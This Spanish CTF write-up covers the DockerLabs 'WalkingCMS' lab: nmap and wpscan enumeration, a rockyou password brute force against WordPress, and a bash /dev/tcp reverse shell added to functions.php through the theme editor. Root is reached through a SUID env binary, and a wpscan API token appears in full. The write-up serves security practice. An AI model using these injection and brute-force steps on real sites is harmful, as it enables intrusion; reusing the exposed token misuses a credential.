---
tags:
  - ctf
  - writeup
platform: DockerLabs
machine: WalkingCMS
difficulty: Easy
os: Linux
status: Completada
---

# DockerLabs — WalkingCMS

## Resumen

Intrusión por fuerza bruta en el panel interno de wordpress y acceso al servidor desde dicho panel.

---

## Reconocimiento

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2
nmap -sCV -p80 172.17.0.2
```

Esta máquina solo tiene un servicio corriendo, el cual es un servidor web en el puerto 80, esto nos deja bastante claro que no vamos a hacer bruteforce a SSH o a FTP.

En la página corre el wordpress en la 172.17.0.2/wordpress, al ver que se trata de un Wordpress decidí no darle muchas vueltas y usar la herramienta **WPScan**.

---

## Enumeración

Usé wpscan con este comando:

```bash
wpscan --url http://172.17.0.2/wordpress/ --api-token xkwZMwgwAsaVzN05FymRwDsJeGc8OBeLSMqDgbKU43g
```

El cual nos va a hacer un escaneo inicial del sitio, encontró bastantes cosas interesantes, incluso un directorio de backups, pero este estaba vacío. Decidí enumerar usuarios de Wordpress con este comando:

```bash
wpscan --url http://172.17.0.2/wordpress/ -e u
```

El cual nos pilló el usuario `mario`, nos falta la contraseña, que hice un ataque de fuerza bruta con este comando:

```bash
wpscan --url http://172.17.0.2/wordpress/ \
--usernames mario \
--passwords /usr/share/wordlists/rockyou.txt
```

Y me encontró la contraseña, `love`:

![Pasted image 20260817012204](../images/Pasted%20image%2020260817012204.png)

Con esto ya podriamos iniciar en el panel de inicio de sesión con Wordpress

---

## Acceso inicial (Foothold)

Inicié sesión en el panel de Wordpress, y decidí irme a temas y a theme code editor, donde tenía acceso a `functions.php`. Lo modifiqué poniendo en la última línea esto de aquí:

```php
system("bash -c 'bash -i >& /dev/tcp/172.17.0.1/4444 0>&1'");
```

Este comando nos envía una reverse shell a mi IP y al puerto 4444. Actualicé los cambios, inicié un listener con `nc -lvnp 4444` y visité 172.17.0.2/wordpress para que se ejecutaran todos los archivos, una vez que entré, ya tenía una shell con el usuario `www-data`.

<img src="../images/Pasted%20image%2020260817013122.png" width="296" alt="Pasted image 20260817013122" />

---

## Escalada de Privilegios

Hice `sudo -l`  pero no era por ahí, así que decidí buscar archivos con SUID:

```bash
find / -perm -u=s -type f 2>/dev/null
```

Me dió unos cuantos, pero me centré en `/usr/bin/env`:

<img src="../images/Pasted%20image%2020260817013405.png" width="316" alt="Pasted image 20260817013405" />

Fui a gtfobins y busqué env, ví que había un apartado para SUID, copié, pegué y conseguí root:

<img src="../images/Pasted%20image%2020260817013510.png" width="591" alt="Pasted image 20260817013510" />

![Pasted image 20260817013540](../images/Pasted%20image%2020260817013540.png)
